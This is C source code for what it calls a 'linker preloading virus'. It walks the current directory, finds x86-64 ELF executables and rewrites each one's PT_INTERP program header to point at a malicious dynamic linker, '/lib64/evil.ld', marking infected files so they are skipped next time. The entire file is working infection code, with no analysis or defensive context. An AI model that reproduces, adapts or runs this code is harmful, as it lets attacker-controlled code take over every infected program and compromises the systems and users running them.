#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <elf.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/mman.h>

#define EVIL_LINKER_PATH "/lib64/evil.ld"

int infect_file(char *filename)
{
	int fd, i;
	uint8_t *mem;
	struct stat st;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	char *interp_path = NULL;

	printf("Attempting to infect '%s'\n", filename);
	fd = open(filename, O_RDWR);
	if (fd < 0) {
		perror("open");
		return -1;
	}
	if (fstat(fd, &st) < 0) {
		perror("fstat");
		return -1;
	}
	mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (mem == NULL) {
		perror("mmap");
		return -1;
	}
	ehdr = (Elf64_Ehdr *)mem;
	phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_INTERP) {
			if (strcmp((char *)&mem[phdr[i].p_offset], EVIL_LINKER_PATH) == 0) {
				printf("File '%s' is already infected\n", filename);
				munmap(mem, st.st_size);
				return 0;
			}
			interp_path = (char *)&mem[phdr[i].p_offset];
			break;
		}
	}
	if (interp_path != NULL) {
		strcpy(interp_path, EVIL_LINKER_PATH);
		printf("Updating the PT_INTERP with '%s'\n", EVIL_LINKER_PATH);
		printf("Successfully infected file '%s'\n", filename);
	}
	munmap(mem, st.st_size);
	return 0;
}
/*
 * Check if filename points to an ELF file we
 * can infect.
 */
int check_criteria(char *filename)
{
        int fd, dynamic, i, ret = 0;
        struct stat st;
        Elf64_Ehdr *ehdr;
        Elf64_Phdr *phdr;
        uint8_t mem[4096];
        uint32_t magic;
        
        fd = open(filename, O_RDONLY, 0);
        if (fd < 0) 
                return false;
        if (read(fd, mem, 4096) < 0)
                return false;
        close(fd);
        ehdr = (Elf64_Ehdr *)mem;
        phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
        if(memcmp("\x7f\x45\x4c\x46", mem, 4) != 0) 
                return -1;
	for (i = 0; i < ehdr->e_phnum; i++) {
		if (phdr[i].p_type == PT_INTERP) {
			char *path = (char *)&mem[phdr[i].p_offset];
			if (strcmp(path, EVIL_LINKER_PATH) == 0) {
				/*
				 * Already infected? Skip this file.
				 */
				return false;
			}
			break;
		}
	}
        if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) 
                return false;
        if (ehdr->e_machine != EM_X86_64) 
                return false;
        return true;
}

int main(int argc, char **argv)
{
	char *dir = NULL, **files, *fpath, dbuf[32768];
	struct dirent *d;
	DIR *dp;

	printf("[!] Module: 'virus_payload.o' linker preloading virus\n");
	dp = opendir(".");
	if (dp == NULL) {
		perror("opendir");
		return -1;
	}
	while ((d = readdir(dp)) != NULL) {
		if (check_criteria(d->d_name) == true) {
			infect_file(d->d_name);
		}
	}
	return 0;
}
